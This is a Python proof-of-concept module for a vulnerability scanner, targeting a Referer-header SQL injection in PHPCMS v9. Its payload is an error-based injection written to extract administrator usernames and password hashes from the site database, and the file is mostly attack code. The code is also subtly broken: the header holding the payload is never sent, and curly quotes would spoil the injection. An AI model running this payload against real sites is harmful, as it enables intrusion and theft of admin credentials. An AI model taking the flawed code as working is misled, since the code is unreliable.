# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'PHPCMS_0025'  # 平台漏洞编号，留空
    name = 'PHPCMSv9 SQL注入（Rerferer注入）'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-01-08'  # 漏洞公布时间
    desc = '''
        PHPCMS采用PHP5+MYSQL做为技术基础进行开发。9采用OOP（面向对象）方式进行基础运行框架搭建。模块化开发方式做为功能开发形式。框架易于功能扩展，代码维护，优秀的二次开发能力，可满足所有网站的应用需求。 5年开发经验的优秀团队，在掌握了丰富的WEB开发经验和CMS产品开发经验的同时，勇于创新追求完美的设计理念，为全球多达10万网站提供助力，并被更多的政府机构、教育机构、事业单位、商业企业、个人站长所认可。
        由于poster_click函数在插入数据库的时候，没对http-referer做过滤，然后产生了注入。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/319/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPCMS'  # 漏洞应用名称
    product_version = 'PHPCMSv9'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a58f6e88-e882-46ee-896f-2b4da43e7746'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-12'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            s = requests.session()
            s.get(self.target)
            payload = "/index.php?m=poster&c=index&a=poster_click&id=1"
            url = self.target + payload
            headers = {
                'Referer': "http://{target}’,(SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(SELECT concat(username,0x5f,md5(c),0x5f,encrypt) FROM v9_admin WHERE 1 ))a from information_schema.tables group by a)b),’1′)#".format(target=self.target)
            }
            r = s.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
